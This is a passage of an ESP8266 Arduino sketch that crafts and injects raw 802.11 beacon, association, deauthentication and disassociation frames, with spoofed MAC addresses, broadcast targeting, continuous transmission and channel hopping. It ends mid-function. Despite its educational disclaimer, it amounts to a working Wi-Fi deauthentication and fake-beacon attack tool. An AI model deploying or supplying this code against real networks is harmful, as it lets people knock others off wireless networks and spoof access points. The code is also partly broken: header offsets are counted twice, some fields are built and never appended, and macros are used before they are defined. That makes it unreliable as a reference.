#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <user_interface.h>

// ESP8266 SDK function declarations
extern "C" {
    void ets_delay_us(uint32_t us);
    void system_soft_wdt_feed(void);
    
    #ifndef ICACHE_RAM_ATTR
    #define ICACHE_RAM_ATTR __attribute__((section(".iram.text")))
    #endif
}

#include "ieee80211_structs.h"

/**
 * ESP8266 Raw 802.11 Management Frame Transmission
 * 
 * This sketch demonstrates crafting and transmitting raw IEEE 802.11 management frames using 
 * ESP8266's low-level WiFi capabilities. Implements:
 * - Association Request frames
 * - Beacon frames
 * - Deauthentication frames
 * - Disassociation frames
 * 
 * WARNING: This code bypasses normal WiFi protocols and should ONLY be used for:
 * - Educational purposes
 * - Network security research
 * - Protocol analysis
 * 
 * IMPORTANT: Transmitting unauthorized packets may violate regulations in your region.
 * Always ensure compliance with local laws and regulations.
 */

// Global exports matching header declarations
uint16_t sequence_number __attribute__((aligned(4)));
uint8_t channel_scan __attribute__((aligned(4)));

// Global variables for internal use
static uint32_t __attribute__((aligned(4))) g_sequence_number = 0;
static uint32_t __attribute__((aligned(4))) g_wifi_channel = 1;
static uint32_t __attribute__((aligned(4))) g_channel_scan = 1;

// Hopping log control
static bool hop_log_enabled = true;           // Control hopping log output
static bool hop_log_on_error = true;          // Log only on channel hop errors
static bool hop_log_on_success = false;       // Log on successful transmissions
static uint32_t last_hop_log = 0;            // Timestamp of last hop log
static const uint32_t HOP_LOG_INTERVAL = 1000; // Minimum interval between logs (ms)

// Channel statistics array with proper alignment
ChannelStats channel_stats[WIFI_CHANNEL_MAX + 1] __attribute__((aligned(4))) = {0};

// Accessor functions to ensure atomic access
ICACHE_RAM_ATTR static inline uint16_t get_sequence_number() {
    return sequence_number & 0xFFFF;
}

ICACHE_RAM_ATTR static inline void increment_sequence_number() {
    sequence_number = (sequence_number + 1) & 0xFFFF;
}

ICACHE_RAM_ATTR static inline uint8_t get_wifi_channel() {
    return g_wifi_channel & 0xFF;
}

ICACHE_RAM_ATTR static inline void set_wifi_channel(uint8_t channel) {
    g_wifi_channel = channel & 0xFF;
}

ICACHE_RAM_ATTR static inline uint8_t get_channel_scan() {
    return channel_scan & 0xFF;
}

ICACHE_RAM_ATTR static inline void set_channel_scan(uint8_t channel) {
    channel_scan = channel & 0xFF;
}

// Replace esp_random with ESP equivalent
#define esp_random() (*(volatile uint32_t*)0x3FF20E44)

// Global MAC addresses and channel
// Target AP MAC Address (replace with your target)
uint8_t target_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast address
// Your spoofed MAC Address
uint8_t source_mac[6] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC};

// Default SSID and channel
char ssid[33] = "TestNetwork";

// Frame type selection
enum FrameType {
  FRAME_ASSOC_REQ = 0,
  FRAME_BEACON,
  FRAME_DEAUTH,
  FRAME_DISASSOC
};
FrameType selected_frame = FRAME_ASSOC_REQ;

// Reason code for deauth/disassoc
uint16_t reason_code = 0x0001;

// Buffers for each frame type
ICACHE_RAM_ATTR uint8_t beacon_buffer[512] __attribute__((aligned(4)));
ICACHE_RAM_ATTR uint8_t deauth_buffer[512] __attribute__((aligned(4)));
ICACHE_RAM_ATTR uint8_t disassoc_buffer[512] __attribute__((aligned(4)));

/**
 * Packet building implementations
 */
extern "C" {

/**
 * Build a raw 802.11 Beacon frame
 */
uint16_t build_beacon_packet(uint8_t* buffer, const uint8_t* bssid, const char* ssid, uint8_t channel) {
  if (!buffer || !bssid || !ssid || channel < 1 || channel > 14) {
    Serial.println(F("Error: Invalid beacon parameters"));
    return 0;
  }

  if (((uintptr_t)buffer) % BUFFER_ALIGNMENT != 0) {
    Serial.println(F("Error: Buffer not aligned to 4-byte boundary"));
    return 0;
  }

  memset(buffer, 0, MAX_PACKET_SIZE);
  uint16_t pos = 0;
  
  // MAC Header
  ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
  header->frame_ctrl.protocol_version = 0;
  header->frame_ctrl.type = 0; // Management
  header->frame_ctrl.subtype = 8; // Beacon
  header->frame_ctrl.to_ds = 0;
  header->frame_ctrl.from_ds = 0;
  header->frame_ctrl.more_frag = 0;
  header->frame_ctrl.retry = 0;
  header->frame_ctrl.power_mgmt = 0;
  header->frame_ctrl.more_data = 0;
  header->frame_ctrl.protected_frame = 0;
  header->frame_ctrl.order = 0;
  header->duration_id = 0;
  memcpy(header->addr1, "\xff\xff\xff\xff\xff\xff", 6); // Broadcast
  memcpy(header->addr2, bssid, 6); // Source (BSSID)
  memcpy(header->addr3, bssid, 6); // BSSID
  header->seq_ctrl = get_next_sequence() << 4;
  pos += sizeof(ieee80211_mac_header_t);
  // Fixed parameters
  // Timestamp (8 bytes, set to 0)
  for (int i = 0; i < 8; i++) buffer[pos++] = 0x00;
  // Beacon interval (0x0064 = 100 TU)
  buffer[pos++] = 0x64; buffer[pos++] = 0x00;
  // Capability info (ESS, short preamble)
  buffer[pos++] = 0x31; buffer[pos++] = 0x04;
  // SSID
  buffer[pos++] = 0x00; // Tag: SSID
  uint8_t ssid_len = strlen(ssid);
  if (ssid_len > 32) {
    Serial.println("SSID too long. Truncating to 32 characters.");
    ssid_len = 32;
  }
  buffer[pos++] = ssid_len;
  memcpy(buffer + pos, ssid, ssid_len); pos += ssid_len;
  // Supported Rates
  buffer[pos++] = 0x01; buffer[pos++] = 0x08;
  buffer[pos++] = 0x82; buffer[pos++] = 0x84; buffer[pos++] = 0x8B; buffer[pos++] = 0x96;
  buffer[pos++] = 0x0C; buffer[pos++] = 0x12; buffer[pos++] = 0x18; buffer[pos++] = 0x24;
  // Extended Supported Rates (optional, but helps compatibility)
  buffer[pos++] = 0x32; buffer[pos++] = 0x04;
  buffer[pos++] = 0x30; buffer[pos++] = 0x48; buffer[pos++] = 0x60; buffer[pos++] = 0x6C;
  // DS Parameter Set
  buffer[pos++] = 0x03; buffer[pos++] = 0x01; buffer[pos++] = channel;
  // TIM (minimal, required for beacon)
  buffer[pos++] = 0x05; buffer[pos++] = 0x04; buffer[pos++] = 0x00; buffer[pos++] = 0x01; buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  // Country Information (optional, but helps with some clients)
  buffer[pos++] = 0x07; buffer[pos++] = 0x06; buffer[pos++] = 'U'; buffer[pos++] = 'S'; buffer[pos++] = 0x01; buffer[pos++] = 0x01; buffer[pos++] = 0x0B; buffer[pos++] = 0x0B;
  return pos;
}

/**
 * Build a raw 802.11 Deauthentication frame
 */
uint16_t build_deauth_packet(uint8_t* buffer, const uint8_t* dst, const uint8_t* src, const uint8_t* bssid, uint16_t reason) {
  if (!buffer || !dst || !src || !bssid) {
    Serial.println(F("Error: Invalid deauth parameters"));
    return 0;
  }

  if (((uintptr_t)buffer) % BUFFER_ALIGNMENT != 0) {
    Serial.println(F("Error: Buffer not aligned to 4-byte boundary"));
    return 0;
  }

  if (reason == 0 || reason > 0x0024) {  // Valid reason codes are 1-36
    Serial.println(F("Error: Invalid reason code"));
    return 0;
  }

  memset(buffer, 0, MAX_PACKET_SIZE);
  uint16_t pos = 0;

  // Initialize MAC header with interrupt protection
  ETS_WDEV_INTR_DISABLE();
  ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
  header->frame_ctrl.protocol_version = 0;
  header->frame_ctrl.type = 0; // Management
  header->frame_ctrl.subtype = 12; // Deauthentication
  header->frame_ctrl.to_ds = 0;
  header->frame_ctrl.from_ds = 0;
  header->frame_ctrl.more_frag = 0;
  header->frame_ctrl.retry = 0;
  header->frame_ctrl.power_mgmt = 0;
  header->frame_ctrl.more_data = 0;
  header->frame_ctrl.protected_frame = 0;
  header->frame_ctrl.order = 0;
  header->duration_id = 0;
  memcpy(header->addr1, dst, 6);
  memcpy(header->addr2, src, 6);
  memcpy(header->addr3, bssid, 6);
  header->seq_ctrl = get_next_sequence() << 4;
  pos += sizeof(ieee80211_mac_header_t);
  // Reason code (2 bytes, little endian)
  buffer[pos++] = reason & 0xFF;
  buffer[pos++] = (reason >> 8) & 0xFF;
  // (Optional) add supported rates for some APs/clients
  // buffer[pos++] = 0x01; buffer[pos++] = 0x08;
  // buffer[pos++] = 0x82; buffer[pos++] = 0x84; buffer[pos++] = 0x8B; buffer[pos++] = 0x96;
  // buffer[pos++] = 0x0C; buffer[pos++] = 0x12; buffer[pos++] = 0x18; buffer[pos++] = 0x24;
  return pos;
}

/**
 * Build a raw 802.11 Disassociation frame
 */
uint16_t build_disassoc_packet(uint8_t* buffer, const uint8_t* dst, const uint8_t* src, const uint8_t* bssid, uint16_t reason) {
  if (!buffer || !dst || !src || !bssid) {
    Serial.println(F("Error: Invalid disassociation parameters"));
    return 0;
  }

  if (((uintptr_t)buffer) % BUFFER_ALIGNMENT != 0) {
    Serial.println(F("Error: Buffer not aligned to 4-byte boundary"));
    return 0;
  }

  if (reason == 0 || reason > 0x0008) {  // Valid reason codes for disassociation are 1-8
    Serial.println(F("Error: Invalid reason code for disassociation"));
    return 0;
  }

  memset(buffer, 0, MAX_PACKET_SIZE);
  uint16_t pos = 0;

  // Initialize MAC header with interrupt protection
  ETS_WDEV_INTR_DISABLE();
  ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
  header->frame_ctrl.protocol_version = 0;
  header->frame_ctrl.type = 0; // Management
  header->frame_ctrl.subtype = 10; // Disassociation
  header->frame_ctrl.to_ds = 0;
  header->frame_ctrl.from_ds = 0;
  header->frame_ctrl.more_frag = 0;
  header->frame_ctrl.retry = 0;
  header->frame_ctrl.power_mgmt = 0;
  header->frame_ctrl.more_data = 0;
  header->frame_ctrl.protected_frame = 0;
  header->frame_ctrl.order = 0;
  header->duration_id = 0;
  memcpy(header->addr1, dst, 6);
  memcpy(header->addr2, src, 6);
  memcpy(header->addr3, bssid, 6);
  header->seq_ctrl = get_next_sequence() << 4;
  pos += sizeof(ieee80211_mac_header_t);
  // Reason code (2 bytes, little endian)
  buffer[pos++] = reason & 0xFF;
  buffer[pos++] = (reason >> 8) & 0xFF;
  // (Optional) add supported rates for some APs/clients
  // buffer[pos++] = 0x01; buffer[pos++] = 0x08;
  // buffer[pos++] = 0x82; buffer[pos++] = 0x84; buffer[pos++] = 0x8B; buffer[pos++] = 0x96;
  // buffer[pos++] = 0x0C; buffer[pos++] = 0x12; buffer[pos++] = 0x18; buffer[pos++] = 0x24;
  return pos;
}

/**
 * Builds an 802.11 Association Request packet that conforms precisely to IEEE standards
 * @param buffer The buffer to store the packet
 * @param dst_addr Destination MAC address (AP)
 * @param src_addr Source MAC address (Station)
 * @param ssid The SSID to associate with
 * @param channel The WiFi channel to operate on
 * @return The size of the generated packet
 */
ICACHE_RAM_ATTR uint16_t build_association_packet(uint8_t* buffer, const uint8_t* dst_addr, 
                                        const uint8_t* src_addr, const char* ssid, uint8_t channel) {
    // Input validation with detailed error messages
    if (!buffer) {
        Serial.println(F("Error: NULL buffer"));
        return 0;
    }
    if (!dst_addr || !src_addr || !ssid) {
        Serial.println(F("Error: Invalid address or SSID"));
        return 0;
    }
    if (((uintptr_t)buffer) % BUFFER_ALIGNMENT != 0) {
        Serial.println(F("Error: Buffer not aligned to 4-byte boundary"));
        return 0;
    }
    if (strlen(ssid) > 32) {
        Serial.println(F("Error: SSID too long (max 32 bytes)"));
        return 0;
    }
    if (channel < 1 || channel > 14) {
        Serial.println(F("Error: Invalid channel (1-14)"));
        return 0;
    }

    memset(buffer, 0, MAX_PACKET_SIZE);
    uint16_t pos = 0;

    // Initialize MAC header
    ieee80211_mac_header_t* header = (ieee80211_mac_header_t*)buffer;
    init_mgmt_frame_header(header, IEEE80211_SUBTYPE_ASSOC_REQ, dst_addr, src_addr, dst_addr);
    
    // Set sequence number atomically
    header->seq_ctrl = get_next_sequence() << 4;  // Upper 12 bits are sequence number
    pos += sizeof(ieee80211_mac_header_t);
  
  // Duration ID
  header->duration_id = 0;  // In little-endian byte order
  
  // Addresses
  memcpy(header->addr1, dst_addr, 6);  // Destination/AP MAC (BSSID)
  memcpy(header->addr2, src_addr, 6);  // Source/Station MAC
  memcpy(header->addr3, dst_addr, 6);  // BSSID (same as destination for Association)
  
  // Sequence Control - Increment for each new frame
  header->seq_ctrl = get_next_sequence() << 4;  // Upper 12 bits are sequence number, lower 4 are fragment number
  
  pos += sizeof(ieee80211_mac_header_t);
  
  // ----- Frame Body -----
  
  // Fixed Parameters
  assoc_fixed_params_t* fixed_params = (assoc_fixed_params_t*)(buffer + pos);
    // Fixed Parameters - Must be in little-endian byte order
  fixed_params->capability_info = 0x0411;  // ESS (0x01) + Short Preamble (0x0020) + Privacy (0x0010)
  
  // Listen Interval - Number of beacon intervals station will listen for
  fixed_params->listen_interval = 0x000A;  // 10 beacon intervals
  
  // Validate fixed parameters size
  if (sizeof(assoc_fixed_params_t) != 4) {
    Serial.println(F("Error: Invalid fixed parameters size"));
    return 0;
  }
  
  pos += sizeof(assoc_fixed_params_t);
    // ----- Tagged Parameters (Information Elements) -----
  
  // SSID Parameter - MANDATORY (Element ID 0)
  if (!add_tagged_param(buffer + pos, 0x00, strlen(ssid), (uint8_t*)ssid)) {
    Serial.println(F("Error: SSID too long"));
    return 0;
  }
  pos += 2 + strlen(ssid);  // ElementID + Length + SSID
  
  // Supported Rates - MANDATORY (Element ID 1)
  const uint8_t supported_rates[] = {
    0x82,  // 1 Mbps   (BSS Basic Rate)
    0x84,  // 2 Mbps   (BSS Basic Rate)
    0x8B,  // 5.5 Mbps (BSS Basic Rate)
    0x96,  // 11 Mbps  (BSS Basic Rate)
    0x0C,  // 6 Mbps
    0x12,  // 9 Mbps
    0x18,  // 12 Mbps
    0x24   // 18 Mbps
  };
  if (!add_tagged_param(buffer + pos, 0x01, sizeof(supported_rates), supported_rates)) {
    Serial.println(F("Error: Could not add supported rates"));
    return 0;
  }
  pos += 2 + sizeof(supported_rates);
  
  // Extended Supported Rates - MANDATORY for 802.11n
  const uint8_t ext_rates[] = {
      0x30,  // 24 Mbps
      0x48,  // 36 Mbps
      0x60,  // 48 Mbps
      0x6C   // 54 Mbps
  };
  if (!add_tagged_param(buffer + pos, IEEE80211_ELEMID_EXT_SUPP_RATES, sizeof(ext_rates), ext_rates)) {
      Serial.println(F("Error: Could not add extended rates"));
      return 0;
  }
  pos += 2 + sizeof(ext_rates);

  // DS Parameter Set - CRITICAL for channel setting
  if (!add_tagged_param(buffer + pos, IEEE80211_ELEMID_DS_PARAMS, 1, &channel)) {
      Serial.println(F("Error: Could not add DS Parameter Set"));
      return 0;
  }
  pos += 3;  // ElementID (1) + Length (1) + Channel (1)

  // HT Capabilities - For 802.11n support
  uint8_t ht_caps[26] = {0};
  ht_caps[0] = 0x6F;  // HT Capability Information (LDPC, 40MHz, GF, SGI-20)
  ht_caps[1] = 0x00;  // HT Capability Information
  ht_caps[2] = 0x17;  // A-MPDU Parameters (64K buffer size)
  memset(ht_caps + 3, 0xFF, 10);  // Supported MCS Set (0-76)
  
  return pos;  // Return length excluding FCS
}

} // extern "C"

// Memory aligned buffer for packet construction (aligned for DMA operations)
static uint32_t __attribute__((aligned(4))) packet_buffer_aligned[128];  // 512 bytes
#define packet_buffer ((uint8_t*)packet_buffer_aligned)

// Debug flag - needs to be volatile as it's changed in interrupt context
static volatile bool debug_mode = false;

// Channel hopping configuration
#define MIN_CHANNEL 1
#define MAX_CHANNEL 14
#define DWELL_TIME 50  // ms per channel
#define CHANNEL_SWITCH_DELAY 5  // ms
#define MAX_PACKET_SIZE 512    // Maximum packet size
#define BUFFER_ALIGNMENT 4     // Required alignment for ESP8266 DMA

// Channel selection strategy
enum HoppingStrategy {
    SEQUENTIAL,      // Simple 1->14 sequence
    ADAPTIVE,        // Based on success rate
    RANDOM          // Random channel selection
} hopping_strategy = ADAPTIVE;

/**
 * Interpret transmission status codes
 */
const char* get_tx_status_string(int status) {
  switch(status) {
    case 0: return "Success";
    case 1: return "Error: Invalid packet structure";
    case 2: return "Error: Wrong channel";
    case 3: return "Error: Hardware not ready";
    case 4: return "Error: Transmission timeout";
    default: return "Unknown error";
  }
}

/**
 * Ensure interrupt-safe functions are marked with ICACHE_RAM_ATTR
 */
ICACHE_RAM_ATTR bool check_hardware_ready() {
    uint32_t status = READ_PERI_REG(0x60000914);
    return (status & 0x00000001) == 0;
}

/**
 * Parse MAC address from string format (XX:XX:XX:XX:XX:XX)
 */
bool parse_mac_address(const char* mac_str, uint8_t* mac_bytes) {
  uint8_t values[6];
  int items = sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                     &values[0], &values[1], &values[2],
                     &values[3], &values[4], &values[5]);
  
  if (items == 6) {
    memcpy(mac_bytes, values, 6);
    return true;
  }
  return false;
}

/**
 * Low-level transmission function using the ESP8266's built-in hardware
 * This uses the vendor-specific register layout to directly control the WiFi chip
 * @param packet Pointer to the packet buffer
 * @param length Length of the packet (excluding FCS)
 * @param rate Transmission rate (1=1Mbps, 2=2Mbps, 5=5.5Mbps, 11=11Mbps, etc.)
 * @param channel WiFi channel to transmit on (1-14)
 */
ICACHE_RAM_ATTR bool transmit_raw_packet(const uint8_t* packet, uint16_t length, uint8_t rate, uint8_t channel) {
    // Validate parameters first
    if (!packet || length == 0 || length > MAX_PACKET_SIZE) {
        return false;
    }

    // Verify buffer alignment for DMA operations
    if (((uintptr_t)packet) % BUFFER_ALIGNMENT != 0) {
        return false;
    }

    // Critical section begins
    noInterrupts();
    uint8_t old_op_mode = wifi_get_opmode();
    
    // Use a static aligned buffer to avoid heap fragmentation
    static uint32_t __attribute__((aligned(4))) tx_buffer_aligned[128];  // 512 bytes
    uint8_t* tx_buffer = (uint8_t*)tx_buffer_aligned;
    
    bool result = false;
    
    // Make sure we don't write past our buffer
    if (length <= sizeof(tx_buffer_aligned)) {
        // Copy the packet to our aligned buffer
        memcpy(tx_buffer, packet, length);
        
        // Switch to station mode and set channel
        wifi_set_opmode(STATION_MODE);
        if (wifi_set_channel(channel)) {
            // Short delay for channel switch with watchdog feed
            os_delay_us(1000);
            system_soft_wdt_feed();
            
            // Disable interrupts during the actual transmission
            ETS_UART_INTR_DISABLE();
            result = wifi_send_pkt_freedom(tx_buffer, length, false) == 0;
            ETS_UART_INTR_ENABLE();
        }
        
        // Restore WiFi mode
        wifi_set_opmode(old_op_mode);
    }
    
    // Critical section ends
    interrupts();
    
    return result;
}

/**
 * Print packet details for debugging
 */
void print_packet_details(const uint8_t* packet, uint16_t length) {
  Serial.println("\n--- 802.11 Packet Details ---");
  
  // Parse frame control field from first two bytes
  frame_control_t* fc = (frame_control_t*)packet;
  Serial.printf("Frame Control: Protocol=%d, Type=%d, Subtype=%d\n", 
                fc->protocol_version, fc->type, fc->subtype);
  Serial.printf("Flags: ToDS=%d, FromDS=%d, MoreFrag=%d, Retry=%d, PwrMgmt=%d, MoreData=%d, Protected=%d, Order=%d\n",
                fc->to_ds, fc->from_ds, fc->more_frag, fc->retry, 
                fc->power_mgmt, fc->more_data, fc->protected_frame, fc->order);
  
  // Duration
  uint16_t duration = packet[2] | (packet[3] << 8);
  Serial.printf("Duration: %d\n", duration);
  
  // Addresses
  Serial.printf("Address1 (Receiver): %02X:%02X:%02X:%02X:%02X:%02X\n", 
                packet[4], packet[5], packet[6], packet[7], packet[8], packet[9]);
  Serial.printf("Address2 (Transmitter): %02X:%02X:%02X:%02X:%02X:%02X\n", 
                packet[10], packet[11], packet[12], packet[13], packet[14], packet[15]);
  Serial.printf("Address3 (BSSID): %02X:%02X:%02X:%02X:%02X:%02X\n", 
                packet[16], packet[17], packet[18], packet[19], packet[20], packet[21]);
  
  // Sequence Control
  uint16_t seq_ctrl = packet[22] | (packet[23] << 8);
  uint16_t seq_num = seq_ctrl >> 4;
  uint8_t frag_num = seq_ctrl & 0x0F;
  Serial.printf("Sequence: %d, Fragment: %d\n", seq_num, frag_num);
  
  // For association request, fixed parameters follow
  if (fc->type == 0 && fc->subtype == 0) {
    uint16_t capability = packet[24] | (packet[25] << 8);
    uint16_t listen_interval = packet[26] | (packet[27] << 8);
    Serial.printf("Capability Info: 0x%04X\n", capability);
    Serial.printf("Listen Interval: %d\n", listen_interval);
    
    // Tagged parameters start at offset 28
    uint16_t offset = 28;
    while (offset < length - 2) {  // Need at least ID and length
      uint8_t id = packet[offset++];
      uint8_t len = packet[offset++];
      
      // Make sure we don't read past the end of the packet
      if (offset + len > length) break;
      
      switch (id) {
        case 0:  // SSID
          Serial.print("SSID: ");
          for (int i = 0; i < len; i++) {
            Serial.write(packet[offset + i]);
          }
          Serial.println();
          break;
          
        case 1:  // Supported Rates
          Serial.print("Supported Rates: ");
          for (int i = 0; i < len; i++) {
            float rate = (packet[offset + i] & 0x7F) * 0.5;
            Serial.printf("%.1f%s ", rate, (packet[offset + i] & 0x80) ? "(B)" : "");
          }
          Serial.println();
          break;
          
        case 3:  // DS Parameter Set
          Serial.printf("DS Parameter Set: Channel %d\n", packet[offset]);
          break;
          
        case 0x32:  // Extended Supported Rates
          Serial.print("Extended Rates: ");
          for (int i = 0; i < len; i++) {
            float rate = (packet[offset + i] & 0x7F) * 0.5;
            Serial.printf("%.1f%s ", rate, (packet[offset + i] & 0x80) ? "(B)" : "");
          }
          Serial.println();
          break;
          
        default:
          Serial.printf("Element ID: %d, Length: %d\n", id, len);
          break;
      }
      
      offset += len;
    }
  }
  
  Serial.println("--- End of Packet Details ---\n");
}

// Hopping log output handler
void log_channel_hop(uint8_t new_channel, bool success, const char* reason) {
    if (!hop_log_enabled) return;
    
    uint32_t current_time = millis();
    if (current_time - last_hop_log < HOP_LOG_INTERVAL) return;
    
    if (success && !hop_log_on_success) return;
    if (!success && !hop_log_on_error) return;
    
    last_hop_log = current_time;
    
    if (success) {
        Serial.printf("[HOP] Channel switched to %d\n", new_channel);
    } else {
        Serial.printf("[HOP-ERR] Failed to switch to channel %d", new_channel);
        if (reason) {
            Serial.printf(" - %s", reason);
        }
        Serial.println();
    }
}

// Print command menu
void print_command_menu() {
    Serial.println("\nAvailable Commands:");
    Serial.println("1-9: Set channel");
    Serial.println("t: Trigger single transmission");
    Serial.println("c: Toggle continuous mode");
    Serial.println("d: Toggle debug mode");
    Serial.println("l: Toggle all hopping logs");
    Serial.println("e: Toggle error-only logging");
    Serial.println("u: Toggle success logging");
    Serial.println("m: Set MAC address");
    Serial.println("f: Select frame type");
    Serial.println("n: Set SSID");
    Serial.println("r: Set reason code");
    Serial.println("s: Show current status");
    Serial.println("?: Show this menu");
}

// Add the declaration of 'get_next_sequence' at the top of the file
ICACHE_RAM_ATTR static uint16_t get_next_sequence() {
    static uint16_t sequence = 0;
    return sequence++ & 0xFFF; // Wrap around at 4095
}

// Enhanced channel selection with timing and state management
ICACHE_RAM_ATTR uint8_t next_channel(uint8_t current_channel) {
    static uint32_t last_hop_time = 0;
    static uint8_t sequential_count = 0;
    uint32_t current_time = millis();
    
    // Enforce minimum dwell time
    if (current_time - last_hop_time < DWELL_TIME) {
        return current_channel;
    }
    
    uint8_t next_ch = current_channel;
    const uint8_t MAX_ATTEMPTS = 5;
    uint8_t attempts = 0;
    
    switch(hopping_strategy) {
        case SEQUENTIAL:
            do {
                sequential_count = (sequential_count + 1) % (MAX_CHANNEL - MIN_CHANNEL + 1);
                next_ch = MIN_CHANNEL + sequential_count;
                attempts++;
            } while (attempts < MAX_ATTEMPTS && 
                    (next_ch == current_channel || channel_stats[next_ch].isBlacklisted()));
            break;
            
        case ADAPTIVE: {
            uint8_t best_channel = current_channel;
            uint32_t best_metric = 0xFFFFFFFF;
            
            // Calculate channel metrics based on multiple factors
            for (uint8_t ch = MIN_CHANNEL; ch <= MAX_CHANNEL; ch++) {
                if (ch == current_channel || channel_stats[ch].isBlacklisted()) {
                    continue;
                }
                
                uint32_t status = channel_stats[ch].status;
                uint8_t fail_count = (status >> 16) & 0xFF;
                uint8_t busy_count = (status >> 8) & 0xFF;
                uint32_t time_since_success = current_time - channel_stats[ch].last_success;
                
                // Weighted metric calculation
                uint32_t metric = (fail_count * 10) + (busy_count * 5) + (time_since_success / 1000);
                
                if (metric < best_metric) {
                    best_metric = metric;
                    best_channel = ch;
                }
            }
            next_ch = best_channel;
            break;
        }
            
        case RANDOM:
            do {
                // Use hardware RNG for better randomness
                next_ch = MIN_CHANNEL + ((*((volatile uint32_t*)0x3FF20E44)) % (MAX_CHANNEL - MIN_CHANNEL + 1));
                attempts++;
            } while (attempts < MAX_ATTEMPTS && 
                    (next_ch == current_channel || channel_stats[next_ch].isBlacklisted()));
            break;
    }
    
    last_hop_time = current_time;
    return next_ch;
}

ICACHE_RAM_ATTR void update_channel_stats(uint8_t channel, bool success) {
    if(success) {
        channel_stats[channel].last_success = millis();
        channel_stats[channel].resetFailCount();
        channel_stats[channel].setBlacklisted(false);
    } else {
        channel_stats[channel].incrementFailCount();
        
        // Get current fail count from packed status
        uint32_t status = channel_stats[channel].status;
        uint8_t fail_count = (status >> 16) & 0xFF;
        
        // Blacklist channel if too many failures
        if(fail_count > 5) {
            channel_stats[channel].setBlacklisted(true);
            // Reset blacklist after 5 seconds
            static unsigned long blacklist_timer = millis();
            if(millis() - blacklist_timer > 5000) {
                for(uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
                    channel_stats[i].setBlacklisted(false);
                }
                blacklist_timer = millis();
            }
        }
    }
}

// Constants for RSSI handling
static const int32_t RSSI_INVALID = -128;
static const int32_t RSSI_THRESHOLD = -65;
static const uint8_t RSSI_SAMPLES = 3;
static const uint16_t RSSI_SAMPLE_INTERVAL = 5; // ms

// Safely check if WiFi is initialized and ready for RSSI readings
ICACHE_RAM_ATTR static bool is_wifi_initialized() {
    uint8_t mode = wifi_get_opmode();
    bool has_power = (READ_PERI_REG(0x3FF00058) & (1 << 6)) != 0;
    return (mode != WIFI_OFF) && has_power;
}

// Get RSSI with averaging and validation
ICACHE_RAM_ATTR static int32_t get_valid_rssi() {
    if (!is_wifi_initialized()) {
        return RSSI_INVALID;
    }

    // Take multiple samples to reduce noise
    int32_t rssi_sum = 0;
    uint8_t valid_samples = 0;

    for (uint8_t i = 0; i < RSSI_SAMPLES; i++) {
        int32_t sample = WiFi.RSSI();
        if (sample != 0 && sample != -127) {
            rssi_sum += sample;
            valid_samples++;
        }
        // Small delay between samples
        delayMicroseconds(100);
    }

    return valid_samples > 0 ? (rssi_sum / valid_samples) : RSSI_INVALID;
}

// Enhanced channel clear assessment
ICACHE_RAM_ATTR bool is_channel_clear(uint8_t channel) {
    static uint32_t last_check_time = 0;
    uint32_t current_time = millis();

    // Rate limit RSSI checks
    if (current_time - last_check_time < RSSI_SAMPLE_INTERVAL) {
        return true;  // Assume clear if checked too recently
    }
    last_check_time = current_time;

    // Get RSSI with validation
    int32_t rssi = get_valid_rssi();
    
    // Handle invalid RSSI cases
    if (rssi == RSSI_INVALID) {
        return true;  // Assume clear if we can't get valid reading
    }

    // Update channel statistics atomically
    if (rssi > RSSI_THRESHOLD) {
        uint32_t busy_mask = 0xFF00;
        uint32_t old_status;
        do {
            old_status = channel_stats[channel].status;
            uint8_t busy_count = (old_status >> 8) & 0xFF;
            if (busy_count < 255) busy_count++;
            uint32_t new_status = (old_status & ~busy_mask) | (busy_count << 8);
            // Atomic update
            asm volatile ("rsil a15, 1\n\t"
                         "s32i %0, %1, 0\n\t"
                         "rsil a15, 0"
                         :
                         : "r" (new_status), "r" (&channel_stats[channel].status)
                         : "a15", "memory");
        } while (channel_stats[channel].status != old_status);
        
        return false;
    }
    
    return true;
}

// Channel management helper functions
ICACHE_RAM_ATTR void initialize_channel_stats() {
    for (uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
        channel_stats[i].last_success = 0;
        channel_stats[i].status = 0; // Clears fail_count, busy_count, and blacklisted
    }
}

ICACHE_RAM_ATTR void update_channel_strategy() {
    static unsigned long last_strategy_update = 0;
    
    if (millis() - last_strategy_update > 10000) {  // Update strategy every 10 seconds
        uint8_t total_blacklisted = 0;
        uint8_t high_failure_channels = 0;
        
        for (uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
            if (channel_stats[i].isBlacklisted()) total_blacklisted++;
            
            // Get fail count from packed status
            uint32_t status = channel_stats[i].status;
            uint8_t fail_count = (status >> 16) & 0xFF;
            if (fail_count > 3) high_failure_channels++;
        }
        
        // Adjust strategy based on channel conditions
        if (total_blacklisted > MAX_CHANNEL / 2) {
            hopping_strategy = RANDOM;  // Try random hopping if many channels are blocked
            // Reset blacklist
            for (uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
                channel_stats[i].setBlacklisted(false);
            }
        } else if (high_failure_channels > MAX_CHANNEL / 3) {
            hopping_strategy = ADAPTIVE;  // Use adaptive if many channels have high failure
        } else {
            hopping_strategy = SEQUENTIAL;  // Default to sequential if conditions are good
        }
        
        last_strategy_update = millis();
    }
}

ICACHE_RAM_ATTR bool perform_channel_hop(uint8_t& current_channel) {
    static uint8_t retry_count = 0;
    const uint8_t MAX_RETRIES = 3;
    bool found_clear_channel = false;
    
    while (!found_clear_channel && retry_count < MAX_RETRIES) {
        uint8_t next_ch = next_channel(current_channel);
        if (wifi_set_channel((uint8)next_ch)) {
            delayMicroseconds(500); // Let channel settle
            
            if (is_channel_clear(next_ch)) {
                current_channel = next_ch;
                found_clear_channel = true;
                retry_count = 0;
                break;
            }
        }
        
        retry_count++;
        // Update busy count atomically
        uint32_t busy_status = channel_stats[next_ch].status;
        uint8_t busy_count = (busy_status >> 8) & 0xFF;
        if (busy_count < 255) {
            uint32_t new_status = (busy_status & ~0xFF00) | ((busy_count + 1) << 8);
            channel_stats[next_ch].status = new_status;
        }
        
        if (retry_count >= MAX_RETRIES) {
            // Force channel change if we can't find a clear one
